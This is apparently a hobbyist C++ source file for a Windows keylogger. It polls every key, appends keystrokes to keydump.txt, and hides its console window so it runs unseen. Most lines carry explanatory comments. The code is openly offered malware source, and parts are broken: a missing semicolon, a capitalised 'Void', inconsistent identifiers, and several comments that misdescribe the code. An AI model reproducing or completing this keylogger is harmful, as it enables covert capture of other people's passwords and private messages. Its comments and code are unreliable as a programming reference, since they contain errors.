#include <Windows.h> //needed to specifiy this is a windows program
#include <cstdio> //another version of standard in/out
#include <iostream> //Header that defines the standard input/output stream objects
#include <fstream> //specifies there will be a file reference in this program
using namespace std; //standard namespace stating that the program will have to look in std to
//get its info

int SaveLogs(int key_stroke, char *file); // uses the SaveLogs() function to state that key_stroke
// will be used as an interger and all char will be placed in a file
void Stealth(); //specifies the stealth function but it will return nothing when the program executes

int main() //used in every C++ program
{

Stealth();

 ofstream myfile; //uses the ofstream (open file) command stating there will be a file that will open
 myfile.open("keydump.txt"); // the file that will be opened will be named and saved as keydump.txt
  //this runs until the window is closed
  while(true)
  {

    Sleep(1)
    //does a loop through all the keys to check what is being typed to screen
    for (int i=0; i<256; i++)
    {
      //check the state of the key if it is down, then it will return
      if(GetAsyncKeyState(i)==-32767)
      SaveLogs(i, "keydump.txt");
 	}
 }
 }
        //output character if its key is pushed down
        int SaveLogs(int key_stroke, char *file) // char is depreicated in C.....program still will runs
        //there will just be a warning
{
          if((key_stroke == 1) or (key_stroke == 2))
          return 0;

        FILE *OUTPUT_FILE; //specify that the file will be named OUTPUT_FILE
        OUTPUT_FILE = fopen(file, "a"); //OUTPUT_FILE is appended to a file using the fopen command with
        //"a" switch
        cout << key_stroke << endl; //Takes key_stroke and specifies it will be outputted, then flushes
        //the line using the endl command, which basically is doing this:
        //cout << key_stroke << '\n';
        //cout.flush();

        if (key_stroke == 8) // Conditional statement used to say if the user input is = to BACKSPACE
        //key, then output this to a file. The numbers stands for the ascii value of a character
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
        else if (key_stroke == 13) // Conditional statement used to say if the user input is = to n
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "n");
        else if (key_stroke == 32) // Conditional statement used to say if the user input is = to " "
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", " ");
        else if (key_stroke == VK_TAB) // Conditional statement used to say if the user input is = to TAB
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
        else if (key_stroke == VK_SHIFT) // Conditional statement used to say if the user input is = to SHIFT buttons
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
        else if (key_stroke == VK_CONTROL) // Conditional statement used to say if the user input is = to CNTL
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
        else if (key_stroke == VK_ESCAPE) // Conditional statement used to say if the user input is = to ESC
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
        else if (key_stroke == VK_END) // Conditional statement used to say if the user input is = to End button
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[END]");
        else if (key_stroke == VK_HOME) // Conditional statement used to say if the user input is = to home button
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
        else if (key_stroke == VK_LEFT) // Conditional statement used to say if the user input is = to left arrow
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
        else if (key_stroke == VK_UP) // Conditional statement used to say if the user input is = to up arrow
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[UP]");
        else if (key_stroke == VK_RIGHT) // Conditional statement used to say if the user input is = to right arrow
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
        else if (key_stroke == VK_DOWN) // Conditional statement used to say if the user input is = to down arrow
        //key, then output this to a file.
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
        else if (key_stroke == 190 or key_stroke == 110) // Conditional statement used to say if the user input is = to
        //ascii 190 or ascii 110, then output "." to this to a file.
        fprintf(OUTPUT_FILE, "%s", ".");
        else
        fprintf(OUTPUT_FILE, "%s", & key_stroke); //ending statement to tell the program to put the
        //string var and key_stroke to the file

        fclose(OUTPUT_FILE); //closes the file once the program has been terminated
        return 0; //ending program return
	}

Void Stealth()
{
  HWND Stealth;
  AllocConsole();
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  MoveWindow(Stealth,-300,-700,0,0,TRUE);
  ShowWindow(stealth,SW_HIDE);
}
